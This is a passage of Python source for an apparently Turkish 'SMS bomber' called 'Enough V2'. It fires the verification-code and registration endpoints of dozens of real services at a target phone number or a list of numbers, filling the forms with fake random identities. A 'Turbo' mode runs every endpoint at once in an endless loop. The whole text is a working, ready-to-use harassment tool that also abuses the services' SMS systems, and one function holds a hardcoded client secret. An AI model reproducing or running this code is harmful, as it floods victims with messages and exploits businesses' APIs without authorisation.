            "phone" : f"+90 ({str(self.phone)[0:3]}) {str(self.phone)[3:6]}-{str(self.phone)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 201:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yotto")
            self.adet += 1
        else:
            raise
      except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yotto")

    #aygaz
    def aygaz(self):
      try:
        url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
        payload = {
            "Gsm" : f"{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> aygaz")
            self.adet += 1
        else:
            raise
      except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> aygaz")

    #pawapp
    def pawapp(self):
      try:
        url = "https://api.pawder.app/api/authentication/sign-up"
        payload = {
            "languageId" : "2",
            "mobileInformation" : "",
            "data" : {
                "firstName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "lastName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "userAgreement" : "true",
                "kvkk" : "true",
                "email" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                "phoneNo" : f"{self.phone}",
                "username" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=10))}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pawapp")
            self.adet += 1
        else:
            raise
      except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pawapp")

    #mopas
    def mopas(self):
      try:
        url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
        r = requests.post(url=url, timeout=2)
        
        if r.status_code == 200:
            token = json.loads(r.text)["access_token"]
            token_type = json.loads(r.text)["token_type"]
            url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobilenumber={self.phone}"
            headers = {"authorization": f"{token_type} {token}"}
            r1 = requests.get(url=url, headers=headers, timeout=5)
            
            if r1.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas")
                self.adet += 1
            else:
                raise
      except:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas")
                

    #ninewest
    def ninewest(self):
      try:
        url = "https://www.ninewest.com.tr/webservice/v1/register.json"
        payload = {
            "alertMeWithEMail" : False,
            "alertMeWithSms" : False,
            "dataPermission" : True,
            "email" : "asdafwqww44wt4t4@gmail.com",
            "genderId" : random.randint(0,3),
            "hash" : "5488b0f6de",
            "inviteCode" : "",
            "password" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))}",
            "phonenumber" : f"({str(self.phone)[0:3]}) {str(self.phone)[3:6]} {str(self.phone)[6:8]} {str(self.phone)[8:10]}",
            "registerContract" : True,
            "registerMethod" : "mail",
            "version" : "3"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ninewest")
            self.adet += 1
        else:
            raise
      except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ninewest")

    #saka
    def saka(self):
     try:
        url = "https://mobilcrm2.saka.com.tr/api/customer/login"
        payload = {
            "gsm" : f"0{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == 1:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> saka")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> saka")

    #superpedestrian
    def superpedestrian(self):
      try:
        url = "https://consumer-auth.linkyour.city/consumer_auth/register"
        payload = {
            "phone_number" : f"+90{str(self.phone)[0:3]} {str(self.phone)[3:6]} {str(self.phone)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["detail"]
        if r1 == "Ok":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> superpedestrian")
            self.adet += 1
        else:
            raise
      except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> superpedestrian")

    #gofody -- execute.submit burdan devam
    def gofody(self):
     try:
        url = "https://backend.gofody.com/api/v1/enduser/register/"
        payload = {
            "country_code": "90",
            "phone": f"{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gofody")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gofody")

    #weescooter
    def weescooter(self):
     try:
        url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin"
        payload = {
            "tenant": "62a1e7efe74a84ea61f0d588",
            "gsm": f"{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> weescooter")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> weescooter")

    #scooby
    def scooby(self):
     try:
        url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phonenumber=90{self.phone}"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> weescooter")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> weescooter")

    #gez
    def gez(self):
     try:
        url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{self}"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["succeeded"]
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gez")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gez")

    #heyscooter
    def heyscooter(self):
     try:
        url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
        headers = {"user-agent" : "okhttp/3.12.1"}
        r = requests.post(url=url, headers=headers, timeout=5)
        r1 = json.loads(r.text)["IsSuccess"]
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyscooter")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyscooter")

    #jetle
    def jetle(self):
     try:
        url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={self.phone}&firmaID=1048"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> jetle")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> jetle")

    #rabbit
    def rabbit(self):
     try:
        url = "https://api.rbbt.com.tr/v1/auth/authenticate"
        payload = {
            "mobile_number" : f"+90{self.phone}",
            "os_name" : "android",
            "os_version" : "7.1.2",
            "app_version" : " 1.0.2(12)",
            "push_id" : "-"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rabbit")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rabbit")

    #roombadi
    def roombadi(self):
     try:
        url = "https://api.roombadi.com/api/v1/auth/otp/authenticate"
        payload = {"phone": f"{self.phone}", "countryId": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> roombadi")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> roombadi")

    #hizlieczaza
    def hizliecza(self):
     try:
        url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"
        payload = {"phonenumber": f"+90{self.phone}", "otpOperationType": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hizliecza")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hizliecza")

    #signalall
    def signalall(self):
     try:
        url = "https://appservices.huzk.com/client/register"
        payload = {
            "name": "",
            "phone": {
                "number": f"{self.phone}",
                "code": "90",
                "country_code": "TR",
                "name": ""
            },
            "countryCallingCode": "+90",
            "countryCode": "TR",
            "approved": True,
            "notifyType": 99,
            "favorites": [],
            "appKey": "live-exchange"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> signalall")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> signalall")

    #goyakit
    def goyakit(self):
     try:
        url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=false"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["data"]["success"]
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> goyakit")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> goyakit")

    #pinar
    def pinar(self):
     try:
        url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"
        payload = {
            "MobilePhone" : f"{self.phone}"
        }
        headers = {
            "devicetype" : "android",
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.text == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> goyakit")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> goyakit")

    #oliz
    def oliz(self):
     try:
        url = "https://api.oliz.com.tr/api/otp/send"
        payload = {
            "mobile_number" : f"{self.phone}",
            "type" : None
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["meta"]["messages"]["success"][0]
        if r1 == "SUCCESS_SEND_SMS":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> goyakit")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> goyakit")

    #marti
    def marti(self):
     try:
        url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
        payload = {
            "mobilePhone" : f"{self.phone}",
            "mobilePhoneCountryCode" : "90"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> goyakit")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> goyakit")

    #karma
    def karma(self):
     try:
        url = "https://api.gokarma.app/v1/auth/send-sms"
        payload = {
            "phonenumber" : f"90{self.phone}",
            "type" : "REGISTER",
            "deviceId" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
            "language" : "tr-TR"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> goyakit")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> goyakit")

    #hoplagit
    def hop(self):
     try:
        url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
        payload = {
            "phone" : f"+90{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> goyakit")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> goyakit")

    #anadolu
    def anadolu(self):
     try:
        url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"
        payload = urllib.parse.urlencode({
            "Numara": f"{str(self.phone)[0:3]}{str(self.phone)[3:6]}{str(self.phone)[6:8]}{str(self.phone)[8:10]}"
        })
        headers = {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        if r.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> goyakit")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> goyakit")

    #total
    def total(self):
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     try:
        url = f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={self.phone}"
        r = requests.post(url=url, verify=False, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> goyakit")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> goyakit")

    #englishhome
    def englishhome(self):
     try:
        url = "https://www.englishhome.com:443/enh_app/users/registration/"
        payload = {
            "first_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "last_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}@gmail.com",
            "phone": f"0{self.phone}",
            "password": f"{''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=8))}",
            "email_allowed": False,
            "sms_allowed": False,
            "confirm": True,
            "tom_pay_allowed": True
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 202:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> goyakit")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> goyakit")

    #petrolofisi
    def petrolofisi(self):
     try:
        url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
        payload = {
            "approvedContractVersion": "v1",
            "approvedKvkkVersion": "v1",
            "contractPermission": True,
            "deviceId": "",
            "etkContactPermission": True,
            "kvkkPermission": True,
            "mobilePhone": f"0{self.phone}",
            "name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "plate": f"{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, k=3))}{str(random.randrange(1, 999)).zfill(3)}",
            "positiveCard": "",
            "referenceCode": "",
            "surname": f"{''.join(random.choices(string.ascii_lowercase, k=8))}"
        }
        headers = {
            "X-Channel": "IOS"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 204:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> goyakit")
            self.adet += 1
        else:
            raise
     except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> goyakit")

    #SON


servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)


            
while 1:
    system("cls||clear")
    print("""{}

 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓████████▓▒░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ░▒▓██▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░  ░▒▓██▓▒░  ░▒▓██████▓▒░ ░▒▓███████▓▒░  
░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██▓▒░    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                                                                                             
                                                                                             

 Enough V2 [ Discord : cyrozer_ ]
                                                                               

 Sms Api: {} 
    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
    try:
        menu = (input(Fore.LIGHTMAGENTA_EX + "Enough Rev\n\n 1- SMS Gönder (Normal)\n\n 2- SMS Gönder (Turbo)\n\n 3- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
        sleep(3)
        continue
    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        tel_liste = []
        if tel_no == "":
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: "+ Fore.LIGHTGREEN_EX, end="")
            dizin = input()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            tel_liste.append(i)
                sonsuz = ""
            except FileNotFoundError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı dosya dizini. Tekrar deneyiniz.")
                sleep(3)
                continue
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"  
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
                sleep(3)
                continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        if kere is None: 
            sms = SendSms(tel_no, mail)
            while True:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            exec("sms."+attribute+"()")
                            sleep(aralik)
        for i in tel_liste:
            sms = SendSms(i, mail)
            if isinstance(kere, int):
                    while sms.adet < kere:
                        for attribute in dir(SendSms):
                            attribute_value = getattr(SendSms, attribute)
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    if sms.adet == kere:
                                        break
                                    exec("sms."+attribute+"()")
                                    sleep(aralik)
        print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
        input()
    elif menu == 3:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break
    elif menu == 2:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        send_sms = SendSms(tel_no, mail)
        try:
            while True:
                with ThreadPoolExecutor() as executor:
                    futures = [
                        executor.submit(send_sms.Akasya),
                        executor.submit(send_sms.Akbati),
                        executor.submit(send_sms.Ayyildiz),
                        executor.submit(send_sms.Baydoner),
                        executor.submit(send_sms.Beefull),
                        executor.submit(send_sms.Bim),
                        executor.submit(send_sms.Bisu),
                        executor.submit(send_sms.Bodrum),
                        executor.submit(send_sms.Clickme),
                        executor.submit(send_sms.Dominos),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Hizliecza),
                        executor.submit(send_sms.Icq),
                        executor.submit(send_sms.Ipragaz),
                        executor.submit(send_sms.Istegelsin),
                        executor.submit(send_sms.Joker),
                        executor.submit(send_sms.KahveDunyasi),
                        executor.submit(send_sms.KimGb),
                        executor.submit(send_sms.Komagene),
                        executor.submit(send_sms.Koton),
                        executor.submit(send_sms.KuryemGelsin),
                        executor.submit(send_sms.Macro),
                        executor.submit(send_sms.Metro),
                        executor.submit(send_sms.Migros),
                        executor.submit(send_sms.Naosstars),
                        executor.submit(send_sms.Paybol),
                        executor.submit(send_sms.Pidem),
                        executor.submit(send_sms.Porty),
                        executor.submit(send_sms.Qumpara),
                        executor.submit(send_sms.Starbucks),
                        executor.submit(send_sms.Suiste),
                        executor.submit(send_sms.Taksim),
                        executor.submit(send_sms.Tasdelen),
                        executor.submit(send_sms.Tasimacim),
                        executor.submit(send_sms.Tazi),
                        executor.submit(send_sms.TiklaGelsin),
                        executor.submit(send_sms.ToptanTeslim),
                        executor.submit(send_sms.Ucdortbes),
                        executor.submit(send_sms.Uysal),
                        executor.submit(send_sms.Wmf),
                        executor.submit(send_sms.Yapp),
                        executor.submit(send_sms.YilmazTicaret),
                        executor.submit(send_sms.Yuffi),
                        executor.submit(send_sms.a101),
                        executor.submit(send_sms.defacto),
                        executor.submit(send_sms.ikinciyeni),
                        executor.submit(send_sms.ceptesok),
                        executor.submit(send_sms.pisir),
                        executor.submit(send_sms.coffy),
                        executor.submit(send_sms.sushico),
                        executor.submit(send_sms.kalmasin),
                        executor.submit(send_sms.yotto),
                        executor.submit(send_sms.aygaz),
                        executor.submit(send_sms.pawapp),
                        executor.submit(send_sms.mopas),
                        executor.submit(send_sms.ninewest),
                        executor.submit(send_sms.saka),
                        executor.submit(send_sms.superpedestrian),
                        executor.submit(send_sms.gofody),
                        executor.submit(send_sms.weescooter),
                        executor.submit(send_sms.scooby),
                        executor.submit(send_sms.gez),
                        executor.submit(send_sms.heyscooter),
                        executor.submit(send_sms.jetle),
                        executor.submit(send_sms.rabbit),
                        executor.submit(send_sms.roombadi),
                        executor.submit(send_sms.hizliecza),
                        executor.submit(send_sms.signalall),
                        executor.submit(send_sms.goyakit),
                        executor.submit(send_sms.pinar),
                        executor.submit(send_sms.oliz),
                        executor.submit(send_sms.marti),
                        executor.submit(send_sms.karma),
                        executor.submit(send_sms.hop),
                        executor.submit(send_sms.anadolu),
                        executor.submit(send_sms.total),
                        executor.submit(send_sms.englishhome),
                        executor.submit(send_sms.petrolofisi),
                        #bazı apileri buraya yazmayı unutmuş olabilirim ama bakmaya çok üşendim 
                    ]
                    wait(futures)
        except KeyboardInterrupt:
            system("cls||clear")
            print("\nMenüye Dönülüyor...")
            sleep(2)
